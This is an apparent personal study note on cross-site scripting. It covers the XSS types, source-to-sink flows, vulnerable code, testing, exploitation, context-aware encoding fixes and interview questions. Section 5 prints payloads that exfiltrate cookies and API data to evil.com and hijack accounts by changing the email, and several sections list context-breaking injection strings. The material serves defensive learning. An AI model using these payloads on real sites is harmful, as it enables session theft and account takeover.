---
tags: [vuln, web, a05, xss, injection]
owasp: A05:2025
difficulty: medium
status: learning
---

# Cross-Site Scripting (XSS)

> Same root cause as [[Injection-SQLi]] — untrusted data crosses from data context into code context — but the "code" is **JavaScript running in the victim's browser**, in the victim's session, on the victim's origin. That's why impact is so high: your injected script *is* the user.

---

## 1. The three types

| Type | Where the payload lives | Trigger | Hardest to fix |
|---|---|---|---|
| **Reflected** | In the request (URL/param), echoed into the immediate response | Victim clicks attacker's link | No |
| **Stored** | Saved server-side (DB), served to every viewer | Victim just visits the page | No — but highest impact (wormable, hits admins) |
| **DOM-based** | Never touches the server; client-side JS writes attacker input into a sink | Fragment/URL processed by JS | Yes — server-side output encoding does nothing |

DOM XSS is the modern battleground because SPAs do everything client-side. Learn it well.

---

## 2. Root cause

Data flows from a **source** (attacker-controllable input) to a **sink** (a place that interprets HTML/JS) without **context-appropriate encoding**.

```
Source  ───────────────►  Sink
location.hash             innerHTML
req.query.q               document.write
localStorage              eval / setTimeout(str)
postMessage data          element.setAttribute('onclick', ...)
```

The phrase **"context-appropriate"** is the whole game — see §6.

---

## 3. Vulnerable code

```javascript
// ❌ DOM XSS — the #1 modern pattern
document.getElementById('greeting').innerHTML = 
    "Hello " + new URLSearchParams(location.search).get('name');
//  ?name=<img src=x onerror=alert(document.cookie)>

// ❌ React — the one dangerous escape hatch (React is safe by default otherwise)
<div dangerouslySetInnerHTML={{__html: userBio}} />

// ❌ Reflected — server echoes input unencoded
res.send(`<h1>Results for ${req.query.q}</h1>`);
```
```python
# ❌ Flask/Jinja with autoescaping defeated
return render_template_string("<h1>" + query + "</h1>")   # not autoescaped
return Markup(user_input)                                  # explicitly trusts it
```

---

## 4. How to find it

### Black-box
1. Inject a unique canary (`zqx123`) in every input, find where it reflects, then check *what context* it lands in (HTML body? attribute? inside a `<script>`? in a URL?).
2. Escalate the canary to a context-breaking payload:
   - HTML body: `<img src=x onerror=alert(1)>`
   - Attribute: `" autofocus onfocus=alert(1) x="` (break out of the attribute)
   - Inside `<script>`: `</script><img src=x onerror=alert(1)>` or `';alert(1)//`
   - URL/href: `javascript:alert(1)`
3. For **DOM XSS**, don't watch the server — read the JS. Trace sources (`location.*`, `document.referrer`, `postMessage`) to sinks (`innerHTML`, `eval`, `document.write`, jQuery `$()`/`.html()`). Browser DevTools → set breakpoints on sinks.
4. Test blind XSS on fields that render in *back-office* tools (support tickets, admin dashboards) — payload calls back to your server (XSS Hunter style). These are the ones that hit admins.

### Code review
```bash
grep -rn "innerHTML\|outerHTML\|document.write\|insertAdjacentHTML\|dangerouslySetInnerHTML\|v-html\|eval(\|setTimeout(['\"]" .
```
Then trace each sink backwards to see if attacker input can reach it unencoded.

---

## 5. Exploitation — impact is the point

`alert(1)` proves execution but proves nothing about impact. In a report, demonstrate the real consequence:

```javascript
// Session theft (only if cookie lacks HttpOnly — check first)
new Image().src = 'https://evil.com/c?'+document.cookie;

// HttpOnly set? Steal what JS CAN reach and act as the user instead:
fetch('/api/me').then(r=>r.json()).then(d=>
  fetch('https://evil.com/x?d='+btoa(JSON.stringify(d))));

// Full account takeover: perform a privileged action in the victim's session
fetch('/api/account/email', {
  method:'POST', credentials:'include',
  headers:{'Content-Type':'application/json'},
  body: JSON.stringify({email:'attacker@evil.com'})
});   // → then trigger password reset → own the account
```

Escalation ladder:
- Steal non-HttpOnly cookies / tokens in `localStorage`
- **Ride the session** to change email/password → ATO (works even with HttpOnly)
- Keylog, phish with injected forms, deface
- **Stored XSS in a shared feed = a worm** (Samy: 1M friends in 20 hours)
- Chain with CSRF token theft to defeat CSRF protections → see [[Chaining-Vulnerabilities]]

> `localStorage` for tokens is XSS-fragile: any XSS reads it directly, and it has no `HttpOnly` equivalent. This is a core argument for cookie-based sessions with `HttpOnly`. See [[Session-Management]].

---

## 6. The fix — context-aware output encoding

**There is no single "escape function."** You encode for the context the data lands in:

| Context | Encode as | Example |
|---|---|---|
| HTML body | HTML entities | `<` → `&lt;` |
| HTML attribute | Attribute encoding + always quote | `"` → `&quot;` |
| JavaScript string | JS/Unicode escaping | `<` → `<` |
| URL | URL encoding | validate scheme is http/https |
| CSS | CSS hex escaping | rare, but real |

**In practice, don't hand-roll this — use the framework's contextual auto-escaping:**
- **React / Vue / Angular** auto-escape by default. The bugs live in the escape hatches: `dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`, `bypassSecurityTrust*`.
- Server templates: keep autoescaping ON (Jinja2, Razor, Thymeleaf, ERB with proper helpers).
- **When you genuinely must render user HTML** (rich text): sanitize with a vetted library — **DOMPurify** on the client. Never a regex, never a hand-written blocklist.
  ```javascript
  element.innerHTML = DOMPurify.sanitize(userHtml);
  ```

**Defence-in-depth (reduces impact, does not replace encoding):**
- Strong **CSP** with nonces + `strict-dynamic` — see [[Browser-Security-Model]]. Turns "full ATO" into "script blocked."
- `HttpOnly` cookies — stops cookie theft (not session riding).
- **Trusted Types** (`require-trusted-types-for 'script'`) — the strongest modern DOM-XSS defence; forces all sink assignments through a vetted policy, making unsafe `innerHTML` a runtime error.

---

## 7. Real-world cases

- **Samy worm (MySpace, 2005)** — stored XSS in a profile; self-propagating; 1M friend requests in ~20 hours. The canonical demonstration of stored-XSS-as-worm.
- **British Airways / Magecart (2018)** — attacker-injected JS skimmed card data from 380k customers. XSS-class supply-chain script injection with direct financial theft.
- **TweetDeck (2014)** — stored XSS retweeted itself across Twitter in minutes.
- **Apache / Atlassian / countless CVEs** — reflected and stored XSS remain among the most-reported web CVEs every year.
- Bug bounty: XSS is consistently one of the highest-*volume* paid classes; blind XSS in admin panels pays especially well.

---

## 8. Practice + interview questions

### Practice
1. **PortSwigger Academy → XSS** — all labs. The "XSS with various contexts" and DOM labs are the ones that build real skill.
2. Build the vulnerable `innerHTML` snippet; pop an alert; then fix it with `textContent`, then with DOMPurify for a rich-text case.
3. Write a payload for each context in the table (body, attribute, inside `<script>`, `javascript:` URL). Being able to break out of each context on demand is the skill.
4. Set up a CSP with a nonce, then try to bypass it (missing `base-uri`, allowlisted CDN, dangling markup). Understand *why* each works.

### Interview questions
- *Three types of XSS and which is worst?* (Reflected/stored/DOM; stored generally worst — no user interaction beyond a visit, hits every viewer including admins, can worm.)
- *How do you fix XSS "properly"?* (Context-aware output encoding, ideally via framework auto-escaping; sanitize with DOMPurify only when rendering HTML is required; CSP + Trusted Types as defence-in-depth. NOT input blocklisting.)
- *Cookie is `HttpOnly`. Is XSS still dangerous?* (Yes — you can't read the cookie, but you can make authenticated requests as the user: change email, transfer funds, read data via the API. HttpOnly limits cookie theft, not session abuse.)
- *What is DOM XSS and why won't server-side encoding fix it?* (Payload never reaches the server; the vulnerable data flow is entirely in client JS, source→sink. Fix at the sink: safe DOM APIs, DOMPurify, Trusted Types.)
- *Difference between `innerHTML` and `textContent` for security?* (`textContent` sets text — inert. `innerHTML` parses HTML — executes markup/handlers. Prefer `textContent`.)

---

**Related:** [[Injection-SQLi]] (sibling injection) · [[CSRF-Cross-Site-Request-Forgery]] (XSS defeats CSRF tokens) · [[Browser-Security-Model]] (CSP/Trusted Types) · [[Session-Management]]
